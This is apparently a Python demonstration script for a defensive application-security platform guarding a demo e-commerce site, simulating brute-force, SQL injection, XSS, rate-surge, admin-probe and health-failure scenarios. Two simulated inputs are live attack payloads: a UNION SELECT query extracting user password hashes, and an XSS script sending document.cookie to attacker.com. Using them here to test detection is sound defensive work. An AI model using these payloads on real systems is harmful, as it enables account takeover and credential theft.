import os
import sys
import time
import json
from datetime import datetime, timezone

# Ensure repository root is on Python path
REPO_ROOT = os.path.abspath(os.path.dirname(__file__))
if REPO_ROOT not in sys.path:
    sys.path.insert(0, REPO_ROOT)

if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

from shopsphere.database import init_db, seed_data
from src.appsec.models import (
    record_security_event, get_security_events,
    get_security_incident, is_client_blocked, unblock_client_ip
)
from src.appsec.detector import AppSecDetector, DetectionResult
from src.appsec.responder import AppSecResponder
from src.appsec.reporter import AppSecReporter


def print_header(title):
    print("\n" + "="*80)
    print(f"   {title}")
    print("="*80)


def run_appsec_demonstration():
    print_header("🛡️  AUTOHEAL APPSEC: AUTONOMOUS APPLICATION DEFENSE PLATFORM ⚡")
    print("  Protecting ShopSphere E-Commerce Against Real-World Web Attack Vectors\n")

    init_db()
    seed_data()
    print("[INIT] Baseline Established. Database schemas and seed data verified.")

    # --------------------------------------------------------------------------
    # SCENARIO A: Repeated Failed Login Attempts (Credential Stuffing / Brute Force)
    # --------------------------------------------------------------------------
    print_header("[SCENARIO A] REPEATED FAILED LOGINS (CREDENTIAL STUFFING / BRUTE FORCE)")
    attacker_ip = "198.51.100.22"
    unblock_client_ip(attacker_ip)

    print(f"[*] Simulating burst of 5 rapid failed login attempts from source IP {attacker_ip}...")
    for i in range(5):
        record_security_event(
            client_ip=attacker_ip,
            method="POST",
            path="/api/shop/auth/login",
            status_code=401,
            event_type="AUTH_FAILURE",
            severity="MEDIUM",
            user_id_or_session=f"shopper_target_{i}",
            details={"attempt": i + 1, "password": "[REDACTED]"}
        )
    print("✓ Recorded 5 security telemetry events in database (sensitive passwords redacted).")

    # Detection & Correlation
    print("[*] Running correlation engine across recent telemetry window...")
    detections = AppSecDetector.correlate_telemetry_window(window_seconds=60)
    auth_det = next((d for d in detections if d.rule_id == "AUTH-001" and d.evidence.get("client_ip") == attacker_ip), None)
    
    if auth_det:
        print(f"🚨 [DETECTION TRIGGERED] Rule: {auth_det.rule_id} ({auth_det.category})")
        print(f"    Severity: {auth_det.severity} | Confidence: {auth_det.confidence * 100:.1f}%")
        print(f"    Finding: {auth_det.summary}")
        print(f"    Why Flagged: {auth_det.why_flagged}")

        # Execute Mitigation
        print("[*] Executing AutoHeal defensive response policy...")
        mitigation = AppSecResponder.execute_defensive_mitigation(auth_det)
        print(f"⚡ [ACTION EXECUTED] {mitigation['action_executed']} -> {mitigation['message']}")
        print(f"    Verification State: {'VERIFIED CONTAINED' if mitigation['verified'] else 'FAILED'}")
        print(f"    Incident ID: {mitigation['incident_id']}")
    else:
        print("✗ Anomaly not triggered.")

    # --------------------------------------------------------------------------
    # SCENARIO B: SQL Injection Attack (Safe Test Request)
    # --------------------------------------------------------------------------
    print_header("[SCENARIO B] SQL INJECTION TEST (UNION SELECT / TAUTOLOGY)")
    sqli_ip = "203.0.113.88"
    unblock_client_ip(sqli_ip)
    sqli_payload = "q=MacBook' UNION SELECT id, email, password_hash, salt, role FROM users--"

    print(f"[*] Simulating incoming request with SQLi payload: {sqli_payload}")
    det_sqli = AppSecDetector.analyze_live_request(
        client_ip=sqli_ip,
        method="GET",
        path="/api/shop/products",
        query_string=sqli_payload
    )

    if det_sqli.triggered:
        print(f"🚨 [DETECTION TRIGGERED] Rule: {det_sqli.rule_id} ({det_sqli.category})")
        print(f"    Severity: {det_sqli.severity} | Confidence: {det_sqli.confidence * 100:.1f}%")
        print(f"    Matched Exploit Syntax: '{det_sqli.evidence.get('matched_pattern')}'")

        mitigation_sqli = AppSecResponder.execute_defensive_mitigation(det_sqli)
        print(f"⚡ [ACTION EXECUTED] {mitigation_sqli['action_executed']} -> {mitigation_sqli['message']}")
        print(f"    Verification State: {'VERIFIED QUARANTINED' if mitigation_sqli['verified'] else 'FAILED'}")
        print(f"    Incident ID: {mitigation_sqli['incident_id']}")

    # --------------------------------------------------------------------------
    # SCENARIO C: Cross-Site Scripting (XSS) Injection Payload
    # --------------------------------------------------------------------------
    print_header("[SCENARIO C] CROSS-SITE SCRIPTING (XSS) PAYLOAD DEFENSE")
    xss_ip = "198.51.100.99"
    unblock_client_ip(xss_ip)
    xss_payload = "q=<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>"

    print(f"[*] Simulating request with XSS payload: {xss_payload}")
    det_xss = AppSecDetector.analyze_live_request(
        client_ip=xss_ip,
        method="GET",
        path="/api/shop/products",
        query_string=xss_payload
    )

    if det_xss.triggered:
        print(f"🚨 [DETECTION TRIGGERED] Rule: {det_xss.rule_id} ({det_xss.category})")
        print(f"    Matched Executable Syntax: '{det_xss.evidence.get('matched_pattern')}'")
        mitigation_xss = AppSecResponder.execute_defensive_mitigation(det_xss)
        print(f"⚡ [ACTION EXECUTED] {mitigation_xss['action_executed']} -> {mitigation_xss['message']}")
        print(f"    Incident ID: {mitigation_xss['incident_id']}")

    # --------------------------------------------------------------------------
    # SCENARIO D: Abnormal Request Rate (API Scraping / DDoS Burst)
    # --------------------------------------------------------------------------
    print_header("[SCENARIO D] ABNORMAL REQUEST RATE & SCRAPING SURGE")
    rate_ip = "192.0.2.14"
    unblock_client_ip(rate_ip)

    print(f"[*] Simulating rapid surge of 30 catalog requests from IP {rate_ip}...")
    for _ in range(30):
        record_security_event(
            client_ip=rate_ip,
            method="GET",
            path="/api/shop/products",
            status_code=200,
            event_type="NORMAL_REQUEST",
            severity="INFO"
        )

    detections_rate = AppSecDetector.correlate_telemetry_window(window_seconds=10)
    rate_det = next((d for d in detections_rate if d.rule_id == "RATE-001" and d.evidence.get("client_ip") == rate_ip), None)
    if rate_det:
        print(f"🚨 [DETECTION TRIGGERED] Rule: {rate_det.rule_id} ({rate_det.category})")
        print(f"    Severity: {rate_det.severity} | Evidence: {rate_det.evidence.get('request_count')} requests")
        mitigation_rate = AppSecResponder.execute_defensive_mitigation(rate_det)
        print(f"⚡ [ACTION EXECUTED] {mitigation_rate['action_executed']} -> {mitigation_rate['message']}")
        print(f"    Incident ID: {mitigation_rate['incident_id']}")

    # --------------------------------------------------------------------------
    # SCENARIO E: Unauthorized Administrative Access Probe
    # --------------------------------------------------------------------------
    print_header("[SCENARIO E] UNAUTHORIZED ADMINISTRATIVE PROBING")
    probe_ip = "203.0.113.105"
    unblock_client_ip(probe_ip)

    print(f"[*] Simulating unauthenticated request to /api/shop/admin/stats...")
    det_admin = AppSecDetector.analyze_live_request(
        client_ip=probe_ip,
        method="GET",
        path="/api/shop/admin/stats",
        headers={"Authorization": "Bearer fake_or_missing_token"}
    )

    if det_admin.triggered:
        print(f"🚨 [DETECTION TRIGGERED] Rule: {det_admin.rule_id} ({det_admin.category})")
        mitigation_admin = AppSecResponder.execute_defensive_mitigation(det_admin)
        print(f"⚡ [ACTION EXECUTED] {mitigation_admin['action_executed']} -> {mitigation_admin['message']}")
        print(f"    Incident ID: {mitigation_admin['incident_id']}")

    # --------------------------------------------------------------------------
    # SCENARIO F: Application Health Failure & Self-Healing Recovery
    # --------------------------------------------------------------------------
    print_header("[SCENARIO F] APPLICATION HEALTH FAILURE & SELF-HEALING RECOVERY")
    print("[*] Simulating unexpected 500 error cascade on checkout service...")
    for _ in range(4):
        record_security_event(
            client_ip="127.0.0.1",
            method="POST",
            path="/api/shop/checkout",
            status_code=500,
            event_type="SERVICE_HEALTH_ERROR",
            severity="HIGH",
            details={"error": "Database connection pool exhaustion simulated"}
        )

    detections_health = AppSecDetector.correlate_telemetry_window(window_seconds=30)
    health_det = next((d for d in detections_health if d.rule_id == "HEALTH-001"), None)
    if health_det:
        print(f"🚨 [DETECTION TRIGGERED] Rule: {health_det.rule_id} ({health_det.category})")
        mitigation_health = AppSecResponder.execute_defensive_mitigation(health_det)
        print(f"⚡ [SELF-HEALING EXECUTED] {mitigation_health['action_executed']} -> {mitigation_health['message']}")
        print(f"    Recovery Verified: {mitigation_health['verified']}")
        print(f"    Incident ID: {mitigation_health['incident_id']}")

    # --------------------------------------------------------------------------
    # FORENSIC REPORT GENERATION INSPECTION
    # --------------------------------------------------------------------------
    print_header("📄 GENERATING COMPREHENSIVE FORENSIC INCIDENT REPORT")
    sample_inc_id = mitigation_sqli["incident_id"] if 'mitigation_sqli' in locals() else mitigation['incident_id']
    report_md = AppSecReporter.generate_markdown_report(sample_inc_id)

    print(f"✓ Generated Forensic Report for Incident {sample_inc_id}:\n")
    print("\n".join(report_md.splitlines()[:28]))  # Print first 28 lines of report
    print("\n... [Full Forensic Dossier & IoC Table persisted to database] ...\n")

    print_header("🎉 ALL 6 APPSEC SCENARIOS DETECTED, MITIGATED & VERIFIED!")
    print("  • REST API: http://localhost:8000/api/security/incidents")
    print("  • Live Storefront: http://localhost:8000/shop")
    print("  • SOC Dashboard: http://localhost:8501")
    print("="*80 + "\n")


if __name__ == "__main__":
    run_appsec_demonstration()
